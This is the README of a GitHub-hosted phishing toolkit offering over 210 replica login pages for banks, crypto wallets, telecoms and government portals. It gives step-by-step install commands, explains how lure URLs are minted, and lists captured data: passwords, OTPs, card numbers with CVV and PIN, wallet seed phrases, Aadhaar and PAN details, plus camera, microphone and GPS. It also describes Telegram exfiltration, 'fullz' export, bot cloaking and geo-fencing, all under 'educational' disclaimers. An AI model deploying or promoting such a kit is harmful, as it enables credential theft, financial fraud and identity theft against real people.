<div align="center">

<img src="assets/hero.png" alt="adhi.phishkit.py" width="820">

**Ultimate educational phishing toolkit — 210+ replica login kits, one file, zero dependencies.**

[![Python](https://img.shields.io/badge/python-3.8%2B-3776ab?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-25e6a4?style=flat-square)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows%20%7C%20termux-555?style=flat-square)]()
[![Kits](https://img.shields.io/badge/kits-210%2B-ffc453?style=flat-square)]()
[![Deps](https://img.shields.io/badge/dependencies-none-25e6a4?style=flat-square)]()
[![PRs](https://img.shields.io/badge/PRs-welcome-4d9bff?style=flat-square)](CONTRIBUTING.md)

</div>

> [!WARNING]
> **For educational and research purposes only.**
> This is **not** an official product. It is not affiliated with, endorsed by or
> sponsored by Google, Meta, Apple, Microsoft, Amazon, X, or any bank, telecom
> operator, wallet provider, game publisher or government portal whose interface
> it replicates. All trademarks belong to their respective owners. The author
> accepts **no liability** for how this tool is used.
>
> → Full text: **[DISCLAIMER.md](DISCLAIMER.md)**

---

## Contents

- [What this is](#what-this-is)
- [Requirements](#requirements)
- [Install and run](#install-and-run)
  - [Linux](#linux)
  - [macOS](#macos)
  - [Termux](#termux)
  - [Windows](#windows)
- [First run](#first-run)
- [Usage](#usage)
- [How it works](#how-it-works)
- [What gets captured](#what-gets-captured)
- [Console](#console)
- [Tunnels](#tunnels)
- [Configuration](#configuration)
- [Troubleshooting](#troubleshooting)
- [Disclaimer and legal](#disclaimer-and-legal)
- [മലയാളം](#മലയാളം)
- [License](#license)

## What this is

A self-hosted phishing **lab**. One Python file, no `pip install`, no SaaS
account, no central server. Start it on a laptop or a phone, pick a replica
login page, hand out the link, watch what lands.

Built for awareness training, classroom demos, CTF-style exercises and
red-team pretexting practice — not for production credential harvesting at
scale.

## Requirements

| | |
|---|---|
| **Python** | 3.8 or newer |
| **Git** | any version (clone only) |
| **ssh client** | optional — SSH-based tunnels only |
| **Disk** | ~40 MB (tunnels download into `bin/`) |
| **RAM** | ~40 MB |
| **Network** | outbound HTTPS for tunnels and fonts |
| **Port** | any free TCP port, default `8080` |

Supported systems: Linux (Debian, Ubuntu, Kali, Arch, Fedora, Alpine),
macOS 11+, Windows 10/11 (PowerShell or WSL), Android via Termux.

No `pip install` is required. Everything is Python standard library.

## Install and run

Pick your platform, run each step in order, one block at a time.

### Linux

Debian / Ubuntu / Kali / Mint:

```bash
sudo apt update
```

```bash
sudo apt install -y python3 git openssh-client curl
```

Arch / Manjaro:

```bash
sudo pacman -Sy --noconfirm python git openssh curl
```

Fedora / RHEL:

```bash
sudo dnf install -y python3 git openssh-clients curl
```

Alpine:

```bash
sudo apk add python3 git openssh-client curl
```

Then, on any distribution:

```bash
python3 --version
```

```bash
git clone https://github.com/adhisankaran-p/adhi-phishkit.git
```

```bash
cd adhi-phishkit
```

```bash
chmod +x adhi.phishkit.py
```

```bash
python3 adhi.phishkit.py -p 8080
```

### macOS

```bash
xcode-select --install
```

```bash
brew install python git openssh
```

```bash
python3 --version
```

```bash
git clone https://github.com/adhisankaran-p/adhi-phishkit.git
```

```bash
cd adhi-phishkit
```

```bash
chmod +x adhi.phishkit.py
```

```bash
python3 adhi.phishkit.py -p 8080
```

> If macOS blocks the tunnel binary:

```bash
xattr -d com.apple.quarantine bin/cloudflared
```

### Termux

```bash
pkg update -y && pkg upgrade -y
```

```bash
pkg install -y python git openssh
```

```bash
termux-setup-storage
```

```bash
git clone https://github.com/adhisankaran-p/adhi-phishkit.git
```

```bash
cd adhi-phishkit
```

```bash
chmod +x adhi.phishkit.py
```

```bash
termux-wake-lock
```

```bash
python3 adhi.phishkit.py -p 8080
```

> Battery optimisation will kill the tunnel — disable it for Termux.
> Camera and microphone require HTTPS — use a tunnel, not `--local`.

### Windows

**Option A — PowerShell (recommended for beginners)**

```powershell
winget install --id Git.Git -e --source winget
```

```powershell
winget install --id Python.Python.3.12 -e --source winget
```

Close and reopen PowerShell, then:

```powershell
python --version
```

```powershell
git clone https://github.com/adhisankaran-p/adhi-phishkit.git
```

```powershell
cd adhi-phishkit
```

```powershell
git update-index --chmod=+x adhi.phishkit.py
```

```powershell
python adhi.phishkit.py -p 8080
```

> `chmod` does not exist on Windows. `git update-index --chmod=+x` still marks
> the file executable so Linux users who clone later get the bit.

**Option B — WSL (recommended for parity with Linux)**

```powershell
wsl --install -d Ubuntu
```

Open Ubuntu, then run the Linux steps above unchanged, including `chmod`.

> Windows Firewall will prompt on first bind — allow private networks.

## First run

The tool prints:

```
console : http://localhost:8080/admin   pass: adhi
victim  : http://<lan-ip>:8080
```

1. Open `http://localhost:8080/admin`
2. Log in with `adhi`
3. **Rotate the password immediately** (Config → Change admin password)
4. Pick a kit
5. Hit **Generate link**
6. Hand the link out

A public Cloudflare tunnel spawns automatically on start.

### Local only

```bash
python3 adhi.phishkit.py -p 8080 --local
```

### Behind your own reverse proxy

```bash
python3 adhi.phishkit.py -p 8080 --local --host https://phish.example.com
```

## Usage

```
python3 adhi.phishkit.py [options]

  -p, --port PORT          port to listen on (default 8080)
      --local              no automatic tunnel
      --tunnel PROVIDER    cloudflared | localhostrun | pinggy | serveo |
                           ngrok | bore | auto   (default auto)
      --host URL           public base URL override
      --default KIT        default kit for the root path
```

Stop with `Ctrl+C`.

## How it works

1. You pick a kit in the console.
2. The tool mints a session token and a vanity path
   (`/netbanking.hdfcbank.com/login/<token>`) — the URL itself is the lure.
3. The victim lands on the replica. Device is detected, layout is chosen.
4. Each submitted step is written to `data/adhi.db`, printed to the terminal,
   pushed to Telegram and shown in the live console.
5. When the flow ends the victim is redirected to the real site, or dropped on a
   "verified successfully" screen that bounces after 2.4 s.
6. Media (camera, mic, documents, geo) lands in `data/uploads/`.

## What gets captured

| Field | Kits |
|---|---|
| Username / email / phone | all |
| Password | all |
| OTP / 2FA code | all |
| Card number, expiry, CVV, holder, PIN | banking, card 3DS, loans, payments |
| Recovery seed phrase (12/24 words) | crypto wallets |
| PAN, Aadhaar, DOB, address, income | loan and KYC flows |
| Account number, IFSC | loan disbursal step |
| ID document photos | loan document step |
| Camera snapshots, mic audio, GPS | device-check kits and any `+ Live panel` kit |

## Console

`/admin` — password protected, session cookie, 12 h TTL.

Live traffic table with sound and desktop alerts · filters (loans / cards /
passwords / seeds) · full-text search · per-session dump with geo map, camera
reel and audio player · `fullz` copy and `.txt` / `.csv` export ·
anti-detection toggles · geo-fence · visit cap · expiry · link generator with
quantity, device mode and QR.

## Tunnels

Free providers, tried in order when set to `auto`:

`cloudflared` → `localhostrun` → `pinggy` → `serveo` → `ngrok` → `bore`

Cloudflared and bore download automatically into `bin/`. A watchdog respawns a
dropped tunnel. `--local` disables all of it.

> Tunnels are third-party and **not** stable. For anything serious, put your own
> domain in front of `--local`.

## Configuration

Runtime state lives in `config.json`, created on first start and git-ignored.
Copy `config.example.json` to seed values. Everything is also editable from the
console.

| Key | Meaning |
|---|---|
| `admin_password` | console password — **change it** |
| `otp_len` | digits requested on OTP steps |
| `cloak` | bounce bots to the real site |
| `burn` | kill the link after a successful capture |
| `instant` | redirect immediately after capture |
| `maxv` / `ttl` / `geo` | visit cap / expiry minutes / country allow-list |
| `telegram_token` / `telegram_chat` | bot notifications |
| `public_url` | base URL used in generated links |
| `tunnel_provider` | default tunnel |

## Troubleshooting

| Problem | Fix |
|---|---|
| `Address already in use` | another port: `-p 9090` |
| `python3: command not found` | install Python, or try `python` |
| Tunnel never comes up | `--tunnel cloudflared`, or `--local` + own domain |
| `Permission denied` on the script | `chmod +x adhi.phishkit.py` |
| Camera/mic never asks | HTTPS is required — use a tunnel, not `--local` |
| Links open the real site | bot cloaking is working; test in a normal browser |
| Termux tunnel dies | `termux-wake-lock`, disable battery optimisation |
| macOS "cannot be opened" | `xattr -d com.apple.quarantine bin/cloudflared` |

## Disclaimer and legal

<details open>
<summary><b>Read this before you use it</b></summary>

1. **Educational use only.** Nothing here is a commercial product.
2. **Not official, not affiliated.** Independent project. No endorsement by any
   brand whose page is replicated.
3. **Approximations, not mirrors.** Replicas are close but not byte-identical.
   A sharp user can tell. Do not advertise them as official.
4. **Trademarks belong to their owners.** Nominative, educational use. A rights
   holder can ask for a kit to be removed or renamed.
5. **Your data, your responsibility.** Captured credentials stay with whoever
   hosts the instance. The author runs no server and holds no copy.
6. **No warranty, no liability.** Supplied "as is". The author is not
   responsible for missed captures, broken tunnels, or any loss caused by use.
7. **Legally a phishing page.** A replica login page is a phishing page, whether
   or not you own the domain. Always tell the victim what was captured.
8. **Rotate the default password.** `adhi` is public knowledge.

Full text: **[DISCLAIMER.md](DISCLAIMER.md)**

</details>

## മലയാളം

ബാങ്ക്, വാലറ്റ്, ടെലികോം, സർക്കാർ പോർട്ടൽ, ഗിഫ്റ്റ് കാർഡ്, സോഷ്യൽ മീഡിയ
ലോഗിൻ പേജുകളുടെ വിദ്യാഭ്യാസ ആവശ്യത്തിനുള്ള കോപ്പികൾ. ഒറ്റ പൈത്തൺ ഫയൽ,
ഡിപൻഡൻസി ഇല്ല, സ്വന്തം മെഷീനിൽ റൺ ചെയ്യാം.

**വിദ്യാഭ്യാസ ആവശ്യത്തിന് മാത്രം. ഇത് ഔദ്യോഗിക ഉൽപ്പന്നമല്ല. രചയിതാവ്
ഉപയോഗത്തിന്റെ ഉത്തരവാദിത്തം ഏൽക്കുന്നില്ല.** പൂർണ്ണ ഡിസ്ക്ലൈമർ:
[DISCLAIMER.md](DISCLAIMER.md)

## License

MIT — see [LICENSE](LICENSE). Trademarks belong to their owners.

<div align="center"><sub>Built for learning. Break it, fork it, improve it.</sub></div>
